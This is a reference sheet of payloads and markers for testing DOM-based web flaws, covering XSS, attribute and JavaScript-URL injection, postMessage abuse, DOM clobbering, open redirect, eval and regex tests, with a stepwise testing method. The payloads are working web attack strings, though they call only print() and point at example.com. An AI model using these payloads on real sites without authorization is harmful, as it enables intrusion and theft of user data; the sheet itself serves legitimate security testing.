# DOM Vulnerability Testing Payloads

## 1. Purpose

This is the general-purpose payload and marker reference for DOM-based vulnerability testing.

Use it when you have identified:

```text
Source
Context
Sink
```

but need controlled test input.

The methodology is:

```text
MARKER
  ↓
CONTEXT TEST
  ↓
SINK TEST
  ↓
EXECUTION / BEHAVIOR
  ↓
IMPACT
```

---

# 2. Universal Markers

Use unique markers:

```text
domtest123
```

```text
sourcetest123
```

```text
sinktest123
```

```text
payloadtest123
```

```text
reflection123
```

---

# 3. Source Testing Markers

## `location.search`

```text
?test=domtest123
```

## `location.hash`

```text
#domtest123
```

## Path

```text
/domtest123
```

## Referrer

Use a controlled authorized page and inspect:

```text
document.referrer
```

## Web Message

```javascript
target.postMessage("domtest123", "*");
```

---

# 4. DOM XSS Tests

```html
<img src=x onerror=print()>
```

```html
<svg onload=print()>
```

```html
<script>print()</script>
```

---

# 5. HTML Context Tests

```html
<b>domtest123</b>
```

```html
<div>domtest123</div>
```

```html
<img src=x>
```

---

# 6. Attribute Context Tests

```text
"
```

```text
'
```

```text
" onmouseover="print()
```

```text
' onmouseover='print()
```

---

# 7. JavaScript Context Tests

```text
'
```

```text
"
```

```text
\
```

```text
`
```

Then inspect how the JavaScript parser handles the value.

---

# 8. URL Sink Tests

```text
https://example.com
```

```text
http://example.com
```

```text
javascript:print()
```

Use only when the sink is known to process URLs.

---

# 9. Open Redirect Test

```text
https://example.com
```

Example:

```text
?url=https://example.com
```

Fragment:

```text
#https://example.com
```

---

# 10. Web Message Test

```javascript
target.postMessage("dommsg123", "*");
```

JSON:

```javascript
target.postMessage(
    '{"type":"test","value":"dommsg123"}',
    "*"
);
```

---

# 11. Web Message URL Test

```javascript
target.postMessage(
    '{"type":"load-channel","url":"https://example.com"}',
    "*"
);
```

Lab execution test:

```javascript
target.postMessage(
    '{"type":"load-channel","url":"javascript:print()"}',
    "*"
);
```

---

# 12. Cookie Test

Marker:

```text
cookietest123
```

Special characters:

```text
;
=
&
%
```

Inspect:

```javascript
document.cookie
```

---

# 13. Storage Test

Marker:

```text
storagetest123
```

Test:

```javascript
localStorage.setItem("test", "storagetest123");
```

and:

```javascript
sessionStorage.setItem("test", "storagetest123");
```

Then trace the consumer.

---

# 14. DOM Clobbering Tests

Basic:

```html
<a id="test"></a>
```

Named:

```html
<form name="test"></form>
```

Configuration:

```html
<a id="config"></a>
```

URL:

```html
<a id="url" href="https://example.com"></a>
```

---

# 15. `setAttribute()` Tests

Controlled value:

```text
https://example.com
```

Marker:

```text
attributetest123
```

Test the actual:

```text
Element
Attribute
Value
```

combination.

---

# 16. WebSocket Tests

Controlled URL:

```text
wss://example.com
```

```text
ws://example.com
```

Marker:

```text
websockettest123
```

Trace:

```text
Source
  ↓
URL
  ↓
WebSocket()
```

---

# 17. `eval()` Test

Harmless execution:

```javascript
print()
```

Marker:

```text
evaltest123
```

Trace:

```text
Input
  ↓
String
  ↓
eval()
```

---

# 18. XPath Tests

Marker:

```text
xpath123
```

Special characters:

```text
'
"
[
]
(
)
```

Trace:

```text
Input
  ↓
XPath
  ↓
document.evaluate()
```

---

# 19. JSON Tests

Valid JSON:

```json
{"test":"json123"}
```

Object:

```json
{"type":"test","value":"json123"}
```

URL:

```json
{"type":"test","url":"https://example.com"}
```

---

# 20. RegExp Tests

Marker:

```text
regextest123
```

Special characters:

```text
*
+
?
{
}
(
)
[
]
|
.
\
^
$
```

Measure:

```text
Execution Time
CPU Usage
Repeated Processing
```

Only report DoS when impact is demonstrated.

---

# 21. Encoding Tests

Raw:

```text
< > " ' &
```

URL encoded:

```text
%3C %3E %22 %27 %26
```

Double encoded:

```text
%253C
```

JavaScript-sensitive:

```text
' " \ `
```

---

# 22. Browser Inspection Commands

## Current URL

```javascript
location.href
```

## Query String

```javascript
location.search
```

## Fragment

```javascript
location.hash
```

## Referrer

```javascript
document.referrer
```

## Cookies

```javascript
document.cookie
```

---

# 23. DOM Inspection

Useful checks:

```javascript
document.body.innerHTML
```

```javascript
document.documentElement.outerHTML
```

Use these to understand how the browser currently represents the DOM.

---

# 24. Named Property Inspection

For DOM Clobbering:

```javascript
window.test
```

```javascript
typeof window.test
```

---

# 25. Storage Inspection

```javascript
localStorage
```

```javascript
sessionStorage
```

---

# 26. Message Inspection

Inside an authorized test handler:

```javascript
window.addEventListener('message', function(event) {
    console.log(event.origin);
    console.log(event.data);
});
```

---

# 27. Payload Selection Method

Use this decision tree:

```text
What is the SOURCE?
        ↓
What is the CONTEXT?
        ↓
What is the SINK?
        ↓
What does the sink interpret?
        ↓
Choose appropriate test
```

---

# 28. Sink-Based Selection

```text
innerHTML
    ↓
HTML payload

location.href
    ↓
URL payload

iframe.src
    ↓
URL payload

postMessage()
    ↓
Message payload

document.cookie
    ↓
Cookie test

setAttribute()
    ↓
Attribute-specific test

eval()
    ↓
JavaScript execution test

JSON.parse()
    ↓
JSON structure test

document.evaluate()
    ↓
XPath test

RegExp()
    ↓
Regex complexity test
```

---

# 29. Safe Testing Order

Always follow:

```text
1. Unique Marker
2. Reflection Check
3. Context Identification
4. Transformation Analysis
5. Validation Analysis
6. Minimal Test
7. Security-Relevant Test
8. Impact Confirmation
```

---

# 30. Avoid Blind Payload Spraying

Do not blindly send:

```text
100 different XSS payloads
```

Instead:

```text
Find Source
    ↓
Find Sink
    ↓
Understand Context
    ↓
Choose One Appropriate Payload
```

This is faster and produces better findings.

---

# 31. Final Testing Checklist

```text
DISCOVERY
☐ Application mapped
☐ JavaScript identified
☐ Sources identified
☐ Sinks identified

DATA FLOW
☐ Source confirmed
☐ Marker inserted
☐ Marker located
☐ Variable traced
☐ Transformations identified
☐ Encoding identified
☐ Decoding identified
☐ Validation identified
☐ Sanitization identified

TESTING
☐ Context identified
☐ Appropriate payload selected
☐ Payload delivered
☐ Browser behavior observed
☐ Sink reached

IMPACT
☐ Behavior reproduced
☐ Security impact confirmed
☐ Evidence captured
☐ Finding documented
```

---

# 32. Master Payload Index

| Vulnerability | Primary Test |
|---|---|
| DOM XSS | `<img src=x onerror=print()>` |
| HTML Injection | `<b>domtest123</b>` |
| Open Redirect | `https://example.com` |
| JavaScript URL | `javascript:print()` |
| Web Message | `postMessage("dommsg123","*")` |
| Cookie | `cookietest123` |
| Storage | `storagetest123` |
| DOM Clobbering | `<a id="test"></a>` |
| WebSocket | `wss://example.com` |
| `eval()` | `print()` |
| XPath | `xpath123` |
| JSON | `{"test":"json123"}` |
| `setAttribute()` | `https://example.com` |
| RegExp | `regextest123` |

---

# Final Rule

```text
MARKER FIRST
     ↓
IDENTIFY CONTEXT
     ↓
IDENTIFY SINK
     ↓
SELECT PAYLOAD
     ↓
OBSERVE BEHAVIOR
     ↓
CONFIRM IMPACT
```

The objective of a payload is not simply to make something execute.

The objective is to prove:

```text
ATTACKER CONTROL
      +
DATA FLOW
      +
SINK
      +
SECURITY IMPACT
```

That is the difference between **payload spraying** and professional DOM vulnerability testing.